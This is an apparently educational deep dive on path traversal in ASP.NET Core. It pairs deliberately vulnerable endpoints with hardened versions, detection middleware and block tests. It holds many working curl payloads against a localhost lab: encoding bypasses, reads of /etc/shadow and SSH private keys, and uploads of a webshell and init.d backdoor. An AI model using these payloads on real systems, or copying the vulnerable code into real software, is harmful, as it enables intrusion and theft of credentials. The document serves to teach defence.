# Path Traversal - Deep Dive

## What is Path Traversal?

Path Traversal (also known as Directory Traversal) is a vulnerability that allows attackers to access files and directories outside the intended directory structure by manipulating file paths. This occurs when applications use user input to construct file system paths without proper validation and sanitization.

## Root Cause Analysis

### Understanding File System Navigation

Path traversal exploits the way file systems handle relative paths:
- `..` means "go up one directory level"
- `/` (Unix) or `\` (Windows) are directory separators
- Multiple `../` can traverse multiple levels up
- Absolute paths can bypass intended restrictions

### Vulnerable Code Patterns

#### 1. No Input Validation

```csharp
[HttpGet("vuln")]
public IActionResult GetFileVulnerable(string filename)
{
    if (string.IsNullOrEmpty(filename))
    {
        return BadRequest("Filename parameter is required");
    }

    try
    {
        // VULNERABLE: No path validation - allows directory traversal
        // Examples of malicious input:
        // - ../../../etc/passwd
        // - ..\\..\\..\\windows\\system32\\drivers\\etc\\hosts
        // - /etc/shadow
        var basePath = Directory.GetCurrentDirectory();
        var filePath = Path.Combine(basePath, "static", filename);

        _logger.LogInformation($"Attempting to read file: {filePath}");

        if (System.IO.File.Exists(filePath))
        {
            var content = System.IO.File.ReadAllText(filePath);
            return Ok(new
            {
                filename = filename,
                content = content,
                fullPath = filePath,
                vulnerability = "Path traversal allows access to any file on the system"
            });
        }

        return NotFound($"File '{filename}' not found at path: {filePath}");
    }
    catch (UnauthorizedAccessException)
    {
        return StatusCode(403, new
        {
            error = "Access denied to file",
            filename = filename,
            hint = "This might indicate the file exists but requires elevated permissions"
        });
    }
}
```

**Critical Problems:**
- Direct use of user input in `Path.Combine()`
- No validation of filename for traversal sequences
- Full file path exposed in response
- Helpful error messages that aid attackers

#### 2. Directory Listing Vulnerability

```csharp
[HttpGet("list/vuln")]
public IActionResult ListDirectoryVulnerable(string directory = ".")
{
    try
    {
        // VULNERABLE: Allows listing any directory on the system
        var targetDirectory = Path.Combine(Directory.GetCurrentDirectory(), directory);

        if (!Directory.Exists(targetDirectory))
        {
            return NotFound($"Directory '{directory}' not found");
        }

        var files = Directory.GetFiles(targetDirectory, "*", SearchOption.AllDirectories)
            .Select(f => new
            {
                name = Path.GetFileName(f),
                path = f,
                size = new FileInfo(f).Length,
                lastModified = new FileInfo(f).LastWriteTime
            });

        return Ok(new
        {
            directory = directory,
            fullPath = targetDirectory,
            files = files,
            vulnerability = "Directory listing exposes file system structure"
        });
    }
    catch (Exception ex)
    {
        return StatusCode(500, new
        {
            error = "Error listing directory",
            details = ex.Message,
            directory = directory
        });
    }
}
```

#### 3. File Upload with Path Control

```csharp
[HttpPost("upload/vuln")]
public async Task<IActionResult> UploadFileVulnerable(IFormFile file, string directory = "uploads")
{
    if (file == null || file.Length == 0)
    {
        return BadRequest("No file uploaded");
    }

    try
    {
        // VULNERABLE: User can control the upload directory
        var uploadPath = Path.Combine(Directory.GetCurrentDirectory(), directory);

        // Create directory if it doesn't exist (dangerous!)
        if (!Directory.Exists(uploadPath))
        {
            Directory.CreateDirectory(uploadPath);
        }

        var filePath = Path.Combine(uploadPath, file.FileName);

        // VULNERABLE: No validation of file name or path
        using (var stream = new FileStream(filePath, FileMode.Create))
        {
            await file.CopyToAsync(stream);
        }

        return Ok(new
        {
            message = "File uploaded successfully",
            filename = file.FileName,
            path = filePath,
            directory = directory,
            vulnerability = "Attacker can upload files to arbitrary directories using '../' in directory parameter"
        });
    }
    catch (Exception ex)
    {
        return StatusCode(500, new
        {
            error = "Upload failed",
            details = ex.Message
        });
    }
}
```

## How Path Traversal Attacks Work

### Attack Vectors and Techniques

#### 1. Basic Directory Traversal

```bash
# Unix/Linux systems - access passwd file
curl "http://localhost:5000/api/pathtraversal/vuln?filename=../../../etc/passwd"

# Windows systems - access hosts file
curl "http://localhost:5000/api/pathtraversal/vuln?filename=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"

# Access shadow file (if permissions allow)
curl "http://localhost:5000/api/pathtraversal/vuln?filename=../../../etc/shadow"
```

**What happens:**
1. `../../../` navigates up three directory levels from the intended "static" folder
2. `etc/passwd` accesses the system user file
3. Application reads and returns the file content
4. Attacker gains system user information

#### 2. Absolute Path Attacks

```bash
# Direct absolute path access
curl "http://localhost:5000/api/pathtraversal/vuln?filename=/etc/passwd"
curl "http://localhost:5000/api/pathtraversal/vuln?filename=C:\\Windows\\System32\\drivers\\etc\\hosts"

# Configuration files
curl "http://localhost:5000/api/pathtraversal/vuln?filename=/etc/apache2/apache2.conf"
curl "http://localhost:5000/api/pathtraversal/vuln?filename=/var/log/auth.log"
```

#### 3. Application-Specific File Access

```bash
# Access application configuration
curl "http://localhost:5000/api/pathtraversal/vuln?filename=../appsettings.json"
curl "http://localhost:5000/api/pathtraversal/vuln?filename=../appsettings.Production.json"

# Database files
curl "http://localhost:5000/api/pathtraversal/vuln?filename=../database.sqlite"
curl "http://localhost:5000/api/pathtraversal/vuln?filename=../backup.sql"

# Log files
curl "http://localhost:5000/api/pathtraversal/vuln?filename=../logs/application.log"
curl "http://localhost:5000/api/pathtraversal/vuln?filename=../logs/error.log"
```

#### 4. Directory Listing Attacks

```bash
# List root directory
curl "http://localhost:5000/api/pathtraversal/list/vuln?directory=../../.."

# List system directories
curl "http://localhost:5000/api/pathtraversal/list/vuln?directory=../../../etc"
curl "http://localhost:5000/api/pathtraversal/list/vuln?directory=../../../var/log"

# List user directories
curl "http://localhost:5000/api/pathtraversal/list/vuln?directory=../../../home"
```

#### 5. File Upload Attacks

```bash
# Upload malicious file to system directory
curl -X POST "http://localhost:5000/api/pathtraversal/upload/vuln?directory=../../../tmp" \
  -F "file=@malicious.php"

# Upload web shell to web directory
curl -X POST "http://localhost:5000/api/pathtraversal/upload/vuln?directory=../../../var/www/html" \
  -F "file=@webshell.php"

# Upload to startup directory
curl -X POST "http://localhost:5000/api/pathtraversal/upload/vuln?directory=../../../etc/init.d" \
  -F "file=@backdoor.sh"
```

### Advanced Attack Techniques

#### 1. Encoding Bypass

```bash
# URL encoding
curl "http://localhost:5000/api/pathtraversal/vuln?filename=..%2F..%2F..%2Fetc%2Fpasswd"

# Double URL encoding
curl "http://localhost:5000/api/pathtraversal/vuln?filename=..%252F..%252F..%252Fetc%252Fpasswd"

# Unicode encoding
curl "http://localhost:5000/api/pathtraversal/vuln?filename=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
```

#### 2. Null Byte Injection (Historical)

```bash
# Null byte to truncate path (older systems)
curl "http://localhost:5000/api/pathtraversal/vuln?filename=../../../etc/passwd%00.txt"
```

#### 3. Path Variation Techniques

```bash
# Mixed separators
curl "http://localhost:5000/api/pathtraversal/vuln?filename=..\\../..\\etc/passwd"

# Redundant separators
curl "http://localhost:5000/api/pathtraversal/vuln?filename=..//..//../..//etc//passwd"

# Current directory references
curl "http://localhost:5000/api/pathtraversal/vuln?filename=./../../etc/passwd"
```

### Attack Progression

#### Phase 1: Discovery and Reconnaissance
```bash
# Test if path traversal exists
curl "http://localhost:5000/api/pathtraversal/vuln?filename=../test.txt"

# Determine operating system
curl "http://localhost:5000/api/pathtraversal/vuln?filename=../../../etc/passwd" # Linux
curl "http://localhost:5000/api/pathtraversal/vuln?filename=..\\..\\..\\windows\\win.ini" # Windows

# Map directory structure
curl "http://localhost:5000/api/pathtraversal/list/vuln?directory=."
curl "http://localhost:5000/api/pathtraversal/list/vuln?directory=.."
```

#### Phase 2: System Information Gathering
```bash
# Get system users
curl "http://localhost:5000/api/pathtraversal/vuln?filename=../../../etc/passwd"

# Get system configuration
curl "http://localhost:5000/api/pathtraversal/vuln?filename=../../../etc/os-release"
curl "http://localhost:5000/api/pathtraversal/vuln?filename=../../../proc/version"

# Get network configuration
curl "http://localhost:5000/api/pathtraversal/vuln?filename=../../../etc/hosts"
curl "http://localhost:5000/api/pathtraversal/vuln?filename=../../../etc/resolv.conf"
```

#### Phase 3: Application Intelligence
```bash
# Application configuration
curl "http://localhost:5000/api/pathtraversal/vuln?filename=../appsettings.json"
curl "http://localhost:5000/api/pathtraversal/vuln?filename=../web.config"

# Database connection strings
curl "http://localhost:5000/api/pathtraversal/vuln?filename=../connectionStrings.config"

# Log files for credentials
curl "http://localhost:5000/api/pathtraversal/vuln?filename=../logs/application.log"
```

#### Phase 4: Privilege Escalation Preparation
```bash
# SSH keys
curl "http://localhost:5000/api/pathtraversal/vuln?filename=../../../home/user/.ssh/id_rsa"
curl "http://localhost:5000/api/pathtraversal/vuln?filename=../../../root/.ssh/authorized_keys"

# Cron jobs
curl "http://localhost:5000/api/pathtraversal/vuln?filename=../../../etc/crontab"
curl "http://localhost:5000/api/pathtraversal/vuln?filename=../../../var/spool/cron/crontabs/root"
```

## Impact Analysis

### File Types Commonly Targeted

#### 1. System Files
```
/etc/passwd          - User account information
/etc/shadow          - Password hashes
/etc/group           - Group information
/etc/hosts           - Host name mappings
/etc/fstab           - File system mount information
/proc/version        - Kernel version
/proc/cmdline        - Boot parameters
```

#### 2. Application Files
```
appsettings.json     - Application configuration
web.config           - IIS configuration
.env                 - Environment variables
database.sqlite      - SQLite database files
logs/application.log - Application logs
backup.sql           - Database backups
```

#### 3. Web Server Files
```
/var/log/apache2/access.log    - Web server access logs
/var/log/nginx/error.log       - Web server error logs
/etc/apache2/apache2.conf      - Apache configuration
/etc/nginx/nginx.conf          - Nginx configuration
```

#### 4. User Files
```
/home/user/.bash_history       - Command history
/home/user/.ssh/id_rsa         - SSH private keys
/home/user/.ssh/known_hosts    - SSH known hosts
/root/.mysql_history           - MySQL command history
```

### Business Impact
- **Data Breach**: Access to sensitive files and databases
- **System Compromise**: Upload of malicious files
- **Credential Theft**: Extraction of passwords and keys
- **Compliance Violations**: Unauthorized access to regulated data
- **Service Disruption**: Modification or deletion of critical files

## Fix Implementation

### 1. Input Validation and Sanitization

```csharp
[HttpGet("secure")]
public IActionResult GetFileSecure(string filename)
{
    if (string.IsNullOrEmpty(filename))
        return BadRequest("Filename parameter is required");

    try
    {
        // SECURE: Validate and sanitize filename
        if (ContainsTraversalSequences(filename))
        {
            _logger.LogWarning("Path traversal attempt detected: {Filename} from IP: {ClientIP}", 
                filename, HttpContext.Connection.RemoteIpAddress);
            return BadRequest("Invalid filename. Directory traversal sequences not allowed.");
        }

        // SECURE: Only allow specific file extensions
        var allowedExtensions = new[] { ".txt", ".json", ".log", ".md", ".csv" };
        var extension = Path.GetExtension(filename).ToLowerInvariant();

        if (!allowedExtensions.Contains(extension))
        {
            return BadRequest($"File extension '{extension}' not allowed. Allowed: {string.Join(", ", allowedExtensions)}");
        }

        // SECURE: Validate filename format
        if (!IsValidFilename(filename))
        {
            return BadRequest("Invalid filename format");
        }

        // SECURE: Use a restricted base directory
        var basePath = Path.Combine(Directory.GetCurrentDirectory(), "static", "allowed");
        var fullPath = Path.Combine(basePath, filename);

        // SECURE: Ensure the resolved path is still within our allowed directory
        var normalizedBasePath = Path.GetFullPath(basePath);
        var normalizedFullPath = Path.GetFullPath(fullPath);

        if (!normalizedFullPath.StartsWith(normalizedBasePath + Path.DirectorySeparatorChar) &&
            !normalizedFullPath.Equals(normalizedBasePath))
        {
            _logger.LogWarning("Path traversal attempt blocked: {Filename} resolved to {FullPath} from IP: {ClientIP}", 
                filename, normalizedFullPath, HttpContext.Connection.RemoteIpAddress);
            return BadRequest("Access denied. Path traversal detected.");
        }

        if (System.IO.File.Exists(fullPath))
        {
            var content = System.IO.File.ReadAllText(fullPath);
            return Ok(new
            {
                filename = filename,
                content = content,
                securityNote = "This endpoint validates input and restricts file access to allowed directories"
            });
        }

        return NotFound($"File '{filename}' not found in allowed directory");
    }
    catch (Exception ex)
    {
        _logger.LogError(ex, "Error accessing file: {Filename} from IP: {ClientIP}", 
            filename, HttpContext.Connection.RemoteIpAddress);
        return StatusCode(500, "An error occurred while processing your request");
    }
}

private bool ContainsTraversalSequences(string filename)
{
    var dangerousSequences = new[]
    {
        "..", "/", "\\", ":", "*", "?", "\"", "<", ">", "|"
    };

    return dangerousSequences.Any(sequence => filename.Contains(sequence));
}

private bool IsValidFilename(string filename)
{
    // Check for invalid characters
    var invalidChars = Path.GetInvalidFileNameChars();
    if (filename.Any(c => invalidChars.Contains(c)))
        return false;

    // Check length
    if (filename.Length > 255)
        return false;

    // Check for reserved names (Windows)
    var reservedNames = new[] { "CON", "PRN", "AUX", "NUL", "COM1", "COM2", "COM3", "LPT1", "LPT2", "LPT3" };
    var nameWithoutExtension = Path.GetFileNameWithoutExtension(filename).ToUpperInvariant();
    if (reservedNames.Contains(nameWithoutExtension))
        return false;

    return true;
}
```

### 2. Restricted Directory Listing

```csharp
[HttpGet("list/secure")]
public IActionResult ListDirectorySecure()
{
    try
    {
        // SECURE: Only list files in a specific allowed directory
        var allowedDirectory = Path.Combine(Directory.GetCurrentDirectory(), "static", "public");

        if (!Directory.Exists(allowedDirectory))
        {
            return NotFound("Public directory not available");
        }

        var files = Directory.GetFiles(allowedDirectory)
            .Where(f => !Path.GetFileName(f).StartsWith(".")) // Exclude hidden files
            .Where(f => IsAllowedFileType(f))
            .Select(f => new
            {
                name = Path.GetFileName(f),
                extension = Path.GetExtension(f),
                size = new FileInfo(f).Length,
                lastModified = new FileInfo(f).LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss")
            });

        return Ok(new
        {
            directory = "public",
            files = files,
            securityNote = "Only public files are listed, no directory traversal allowed"
        });
    }
    catch (Exception ex)
    {
        _logger.LogError(ex, "Error listing public directory");
        return StatusCode(500, "An error occurred while listing files");
    }
}

private bool IsAllowedFileType(string filePath)
{
    var allowedExtensions = new[] { ".txt", ".json", ".log", ".md", ".csv", ".pdf" };
    var extension = Path.GetExtension(filePath).ToLowerInvariant();
    return allowedExtensions.Contains(extension);
}
```

### 3. Secure File Upload

```csharp
[HttpPost("upload/secure")]
public async Task<IActionResult> UploadFileSecure(IFormFile file)
{
    if (file == null || file.Length == 0)
        return BadRequest("No file uploaded");

    try
    {
        // SECURE: Validate file size
        const int maxFileSize = 5 * 1024 * 1024; // 5MB
        if (file.Length > maxFileSize)
        {
            return BadRequest($"File size exceeds limit of {maxFileSize / (1024 * 1024)}MB");
        }

        // SECURE: Validate file extension
        var allowedExtensions = new[] { ".txt", ".pdf", ".jpg", ".png", ".docx", ".csv" };
        var extension = Path.GetExtension(file.FileName).ToLowerInvariant();

        if (!allowedExtensions.Contains(extension))
        {
            return BadRequest($"File type not allowed. Allowed: {string.Join(", ", allowedExtensions)}");
        }

        // SECURE: Validate original filename
        if (!IsValidFilename(file.FileName))
        {
            return BadRequest("Invalid filename");
        }

        // SECURE: Generate safe filename to prevent any path issues
        var safeFileName = $"{Guid.NewGuid()}{extension}";
        var uploadDirectory = Path.Combine(Directory.GetCurrentDirectory(), "uploads", "secure");

        // SECURE: Ensure upload directory exists and is within allowed path
        if (!Directory.Exists(uploadDirectory))
        {
            Directory.CreateDirectory(uploadDirectory);
        }

        var filePath = Path.Combine(uploadDirectory, safeFileName);

        // SECURE: Verify the final path is still within our upload directory
        var normalizedUploadDir = Path.GetFullPath(uploadDirectory);
        var normalizedFilePath = Path.GetFullPath(filePath);

        if (!normalizedFilePath.StartsWith(normalizedUploadDir + Path.DirectorySeparatorChar))
        {
            _logger.LogError("Upload path validation failed: {FilePath}", normalizedFilePath);
            return StatusCode(500, "Upload path validation failed");
        }

        // SECURE: Scan file content for malicious patterns
        using (var stream = file.OpenReadStream())
        {
            if (await ContainsMaliciousContent(stream))
            {
                _logger.LogWarning("Malicious content detected in upload from IP: {ClientIP}", 
                    HttpContext.Connection.RemoteIpAddress);
                return BadRequest("File contains potentially malicious content");
            }
        }

        // Save file
        using (var stream = new FileStream(filePath, FileMode.Create))
        {
            await file.CopyToAsync(stream);
        }

        _logger.LogInformation("File uploaded successfully: {OriginalName} -> {SafeName} from IP: {ClientIP}", 
            file.FileName, safeFileName, HttpContext.Connection.RemoteIpAddress);

        return Ok(new
        {
            message = "File uploaded securely",
            originalName = file.FileName,
            storedName = safeFileName,
            size = file.Length,
            uploadTime = DateTime.UtcNow,
            securityNote = "File validated, renamed, and stored in secure directory"
        });
    }
    catch (Exception ex)
    {
        _logger.LogError(ex, "Secure upload failed for file: {FileName} from IP: {ClientIP}", 
            file.FileName, HttpContext.Connection.RemoteIpAddress);
        return StatusCode(500, "Upload failed");
    }
}

private async Task<bool> ContainsMaliciousContent(Stream stream)
{
    // Basic malicious content detection
    var buffer = new byte[1024];
    var bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length);
    var content = Encoding.UTF8.GetString(buffer, 0, bytesRead).ToLowerInvariant();

    var maliciousPatterns = new[]
    {
        "<?php", "<script", "eval(", "system(", "exec(", "shell_exec",
        "passthru", "file_get_contents", "base64_decode"
    };

    return maliciousPatterns.Any(pattern => content.Contains(pattern));
}
```

### 4. Path Traversal Detection Middleware

```csharp
public class PathTraversalProtectionMiddleware
{
    private readonly RequestDelegate _next;
    private readonly ILogger<PathTraversalProtectionMiddleware> _logger;

    public PathTraversalProtectionMiddleware(RequestDelegate next, ILogger<PathTraversalProtectionMiddleware> logger)
    {
        _next = next;
        _logger = logger;
    }

    public async Task InvokeAsync(HttpContext context)
    {
        // Check all query parameters for path traversal attempts
        foreach (var param in context.Request.Query)
        {
            if (ContainsPathTraversal(param.Value))
            {
                var clientIP = context.Connection.RemoteIpAddress?.ToString();
                _logger.LogWarning("Path traversal attempt detected in parameter '{ParamName}' with value '{Value}' from IP: {ClientIP} on path: {Path}", 
                    param.Key, param.Value, clientIP, context.Request.Path);

                context.Response.StatusCode = 400;
                await context.Response.WriteAsync("Path traversal sequences detected in request parameters");
                return;
            }
        }

        // Check form data if present
        if (context.Request.HasFormContentType)
        {
            foreach (var param in context.Request.Form)
            {
                if (ContainsPathTraversal(param.Value))
                {
                    var clientIP = context.Connection.RemoteIpAddress?.ToString();
                    _logger.LogWarning("Path traversal attempt detected in form parameter '{ParamName}' from IP: {ClientIP}", 
                        param.Key, clientIP);

                    context.Response.StatusCode = 400;
                    await context.Response.WriteAsync("Path traversal sequences detected in form data");
                    return;
                }
            }
        }

        await _next(context);
    }

    private bool ContainsPathTraversal(string value)
    {
        if (string.IsNullOrEmpty(value))
            return false;

        var traversalPatterns = new[]
        {
            "..", "..\\", "../", "..%2f", "..%2F", "..%5c", "..%5C",
            "%2e%2e", "%2e%2e%2f", "%2e%2e%5c", "%2e%2e/", "%2e%2e\\",
            "..%252f", "..%252F", "..%255c", "..%255C"
        };

        return traversalPatterns.Any(pattern => 
            value.Contains(pattern, StringComparison.OrdinalIgnoreCase));
    }
}

// Register in Startup.cs
public void Configure(IApplicationBuilder app, IWebHostEnvironment env)
{
    app.UseMiddleware<PathTraversalProtectionMiddleware>();
    // ... other middleware
}
```

## How the Fixes Work

### 1. Input Validation
```csharp
if (ContainsTraversalSequences(filename))
    return BadRequest("Invalid filename. Directory traversal sequences not allowed.");
```
- **Problem Solved**: Blocks obvious traversal attempts
- **How**: Scans input for dangerous sequences like `..`, `/`, `\`
- **Benefit**: Early detection and rejection of malicious input

### 2. Path Canonicalization
```csharp
var normalizedBasePath = Path.GetFullPath(basePath);
var normalizedFullPath = Path.GetFullPath(fullPath);

if (!normalizedFullPath.StartsWith(normalizedBasePath + Path.DirectorySeparatorChar))
    return BadRequest("Path traversal detected.");
```
- **Problem Solved**: Prevents bypassing via complex path manipulation
- **How**: Resolves all paths to absolute canonical form and compares
- **Benefit**: Catches sophisticated traversal attempts

### 3. File Extension Whitelisting
```csharp
var allowedExtensions = new[] { ".txt", ".json", ".log", ".md", ".csv" };
if (!allowedExtensions.Contains(extension))
    return BadRequest($"File extension not allowed");
```
- **Problem Solved**: Limits access to safe file types only
- **How**: Only allows predetermined safe file extensions
- **Benefit**: Prevents access to executables, config files, etc.

### 4. Restricted Base Directory
```csharp
var basePath = Path.Combine(Directory.GetCurrentDirectory(), "static", "allowed");
```
- **Problem Solved**: Confines file access to specific directory
- **How**: All file operations constrained to predetermined safe directory
- **Benefit**: Even successful traversal can't escape sandbox

### 5. Safe Filename Generation
```csharp
var safeFileName = $"{Guid.NewGuid()}{extension}";
```
- **Problem Solved**: Eliminates filename-based attacks
- **How**: Generates cryptographically random filenames
- **Benefit**: User can't control filename or path components

## Testing the Fix

### Positive Tests (Should Work)
```bash
# Valid filename in allowed directory
curl "http://localhost:5000/api/pathtraversal/secure?filename=document.txt"

# Allowed file extensions
curl "http://localhost:5000/api/pathtraversal/secure?filename=data.json"
curl "http://localhost:5000/api/pathtraversal/secure?filename=report.pdf"
```

### Security Tests (Should Be Blocked)
```bash
# Basic traversal attempts
curl "http://localhost:5000/api/pathtraversal/secure?filename=../../../etc/passwd"
curl "http://localhost:5000/api/pathtraversal/secure?filename=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"

# Encoded traversal attempts  
curl "http://localhost:5000/api/pathtraversal/secure?filename=..%2F..%2F..%2Fetc%2Fpasswd"
curl "http://localhost:5000/api/pathtraversal/secure?filename=..%252F..%252F..%252Fetc%252Fpasswd"

# Absolute path attempts
curl "http://localhost:5000/api/pathtraversal/secure?filename=/etc/passwd"
curl "http://localhost:5000/api/pathtraversal/secure?filename=C:\\Windows\\System32\\drivers\\etc\\hosts"

# Invalid extensions
curl "http://localhost:5000/api/pathtraversal/secure?filename=malicious.exe"
curl "http://localhost:5000/api/pathtraversal/secure?filename=config.ini"

# Invalid characters
curl "http://localhost:5000/api/pathtraversal/secure?filename=file*.txt"
curl "http://localhost:5000/api/pathtraversal/secure?filename=file<>.txt"
```

### Upload Security Tests
```bash
# Malicious file upload attempts
curl -X POST "http://localhost:5000/api/pathtraversal/upload/secure" \
  -F "file=@webshell.php"

curl -X POST "http://localhost:5000/api/pathtraversal/upload/secure" \
  -F "file=@malicious.exe"

# File size limit test
curl -X POST "http://localhost:5000/api/pathtraversal/upload/secure" \
  -F "file=@largefile.pdf"  # > 5MB
```

All security tests should return appropriate error messages and log the attempts, demonstrating that the path traversal vulnerability has been effectively mitigated.
